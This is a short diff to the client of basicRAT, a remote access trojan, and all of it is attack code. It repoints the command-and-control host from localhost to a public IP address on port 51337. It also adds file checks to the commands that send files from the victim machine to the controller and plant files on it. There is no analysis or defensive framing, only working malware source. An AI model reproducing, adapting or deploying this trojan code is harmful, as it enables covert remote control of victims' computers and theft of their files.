@@ -6,6 +6,7 @@
 # https://github.com/vesche/basicRAT
 #
 
+import os
 import socket
 import subprocess
 import sys
@@ -19,8 +20,8 @@ from core import toolkit
 
 
 PLAT = sys.platform
-HOST = 'localhost'
-PORT = 1337
+HOST = '208.68.38.5'
+PORT = 51337
 
 
 def main():
@@ -60,12 +61,18 @@ def main():
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
+                if not os.path.isfile(fname):
+                    continue
+
                 filesock.sendfile(s, GCM, IV, fname)
 
         # receive file
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
+                if os.path.isfile(fname):
+                    continue
+
                 filesock.recvfile(s, GCM, fname)
 
         # regenerate DH key
